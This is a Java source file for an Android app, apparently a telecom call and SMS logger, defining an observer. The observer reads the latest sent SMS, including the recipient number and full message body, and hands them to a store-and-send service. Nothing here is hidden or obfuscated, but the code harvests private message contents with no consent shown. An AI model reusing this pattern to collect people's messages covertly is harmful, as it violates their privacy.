package com.ntua.ote.logger;

import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;
import com.ntua.ote.logger.models.LogDetails;
import com.ntua.ote.logger.utils.Direction;

import java.util.Date;

public class OutgoingSmsObserver extends AbstractObserver {

    private CallLogService service;
    private Date latestSms;
    private String latestSmsId;

    private static final String TAG = CallLogService.class.getName();

    public OutgoingSmsObserver(Handler handler, CallLogService service, Date latestSms) {
        super(handler);
        this.service = service;
        this.latestSms = latestSms;
    }

    protected void getInfoAndSend(){
        try{
            Cursor managedCursor = service.getApplicationContext().getContentResolver().query
                    (Telephony.Sms.Sent.CONTENT_URI, null, null, null, Telephony.Sms.Sent.DATE_SENT + " ASC");
            managedCursor.moveToLast();

            if (!managedCursor.isAfterLast()) {
                int type = managedCursor.getInt(managedCursor.getColumnIndex(Telephony.Sms.Sent.TYPE));
                if (type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                    String id = managedCursor.getString(managedCursor.getColumnIndex(Telephony.Sms._ID));
                    if(!id.equals(latestSmsId)) {
                        latestSmsId = id;
                        String callDate = managedCursor.getString(managedCursor.getColumnIndex(Telephony.Sms.DATE_SENT));
                        // Date logsLateastSms = new Date(Long.valueOf(callDate));
                        //  if (logsLateastSms.after(latestSms)) {
                        //     latestSms = logsLateastSms;
                        String content = managedCursor.getString(managedCursor.getColumnIndex(Telephony.Sms.BODY));
                        String smsNumber = managedCursor.getString(managedCursor.getColumnIndex(Telephony.Sms.ADDRESS));
                        String protocol = managedCursor.getString(managedCursor.getColumnIndex(Telephony.Sms.PROTOCOL));
                        LogDetails logDetails = new LogDetails(smsNumber, new Date(), Direction.OUTGOING, content);
                        service.storeAndSend(logDetails);
                        Log.d(TAG, "protocol:" + protocol);
                        //    }
                    }
                }
            }
            managedCursor.close();
        } catch (SecurityException e) {
            Log.e(TAG, "<on change> READ SMS LOG permission not found");
        }
    }
}
